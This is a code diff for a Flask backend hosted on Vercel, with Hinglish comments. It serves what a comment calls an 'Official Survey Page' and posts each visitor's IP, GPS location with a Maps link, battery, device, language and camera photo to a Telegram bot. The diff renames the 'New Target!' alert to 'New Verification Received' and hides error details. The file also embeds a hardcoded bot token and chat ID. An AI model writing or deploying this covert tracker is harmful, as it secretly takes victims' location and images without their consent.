@@ -3,60 +3,82 @@ import base64
 import requests
 from flask import Flask, render_template, request, jsonify
 
-# Vercel ke liye template folder ka rasta (path) set karna zaroori hai
+# Vercel compatibility: Path pointing to templates folder
 app = Flask(__name__, template_folder='../templates')
 
-# --- CONFIG ---
-# Apne Bot ka Token yahan dalain
-BOT_TOKEN = "8643544666:AAFpPxaQ--xW5L5OlzJ4hOZCYmoEgWf5Mf8"
-# Apni Numerical ID yahan dalain (e.g., "612345678")
-CHAT_ID = "ID: 6908281054"
+# --- CONFIGURATION ---
+# @BotFather se liya hua token yahan paste karein
+BOT_TOKEN = "8643544666:AAFpPxaQ--xW5L5OlzJ4hOZCYmoEgWf5Mf8" 
+# @userinfobot se liya hua numerical ID (e.g., "567213456")
+CHAT_ID = "6908281054" 
 
-def send_telegram(text, photo_bytes=None):
+def send_to_telegram(report_text, photo_bytes=None):
+    """Advanced function to handle telegram delivery"""
     try:
         url = f"https://api.telegram.org/bot{BOT_TOKEN}/"
-        # 1. Pehle Detail Report bhejna
-        requests.post(url + "sendMessage", data={"chat_id": CHAT_ID, "text": text, "parse_mode": "HTML"})
         
-        # 2. Agar photo hai to wo bhejna
+        # 1. Detailed Report bhej raha hai
+        requests.post(url + "sendMessage", data={
+            "chat_id": CHAT_ID, 
+            "text": report_text, 
+            "parse_mode": "HTML",
+            "disable_web_page_preview": False
+        })
+        
+        # 2. Agar camera access mil gaya to photo bhej raha hai
         if photo_bytes:
             files = {'photo': ('capture.jpg', photo_bytes, 'image/jpeg')}
             requests.post(url + "sendPhoto", data={"chat_id": CHAT_ID}, files=files)
+            
     except Exception as e:
-        print(f"Telegram Error: {e}")
+        print(f"Log Error: {e}")
 
 @app.route('/')
 def index():
+    # Official Survey Page load karega
     return render_template('index.html')
 
 @app.route('/capture', methods=['POST'])
 def capture():
     try:
         data = request.get_json()
+        if not data:
+            return jsonify({"status": "failed"}), 400
+
         info = data.get('info', {})
         photo_raw = data.get('photo')
         
-        # IP address nikalna
-        ip = request.headers.get('x-forwarded-for', request.remote_addr)
+        # Professional IP tracking (Vercel headers)
+        ip = request.headers.get('x-forwarded-for', request.remote_addr).split(',')[0]
         
-        report = (f"🎯 <b>New Target!</b>\n\n"
-                  f"🌐 IP: {ip}\n"
-                  f"📍 Loc: {info.get('lat')}, {info.get('lon')}\n"
-                  f"🔋 Battery: {info.get('battery')}\n"
-                  f"📱 Dev: {info.get('platform')}")
+        # Google Maps link generate karna
+        map_url = f"https://www.google.com/maps?q={info.get('lat')},{info.get('lon')}"
+        
+        # Telegram Message Format (Clean & Professional)
+        report = (
+            f"📥 <b>New Verification Received</b>\n"
+            f"━━━━━━━━━━━━━━━━━━\n"
+            f"👤 <b>IP Address:</b> <code>{ip}</code>\n"
+            f"🔋 <b>Battery:</b> {info.get('battery')}\n"
+            f"📱 <b>System:</b> {info.get('platform')}\n"
+            f"🌐 <b>Language:</b> {info.get('lang')}\n"
+            f"📍 <b>Location:</b> <a href='{map_url}'>Open in Google Maps</a>\n"
+            f"━━━━━━━━━━━━━━━━━━\n"
+            f"⏰ <b>Status:</b> Success"
+        )
 
+        # Image processing
         if photo_raw and "," in photo_raw:
             header, encoded = photo_raw.split(",", 1)
             photo_bytes = base64.b64decode(encoded)
-            send_telegram(report, photo_bytes)
+            send_to_telegram(report, photo_bytes)
         else:
-            send_telegram(report)
+            send_to_telegram(report)
 
         return jsonify({"status": "success"}), 200
-    except Exception as e:
-        return jsonify({"status": "error", "message": str(e)}), 500
 
-# --- VERCEL SPECIFIC ---
-# Vercel ko 'app' object chahiye hota hai handle karne ke liye
-# Ye line hatani nahi hai
-                  
+    except Exception as e:
+        # Server error hide karne ke liye generic response
+        return jsonify({"status": "internal_error"}), 500
+
+# Vercel handles the app object directly
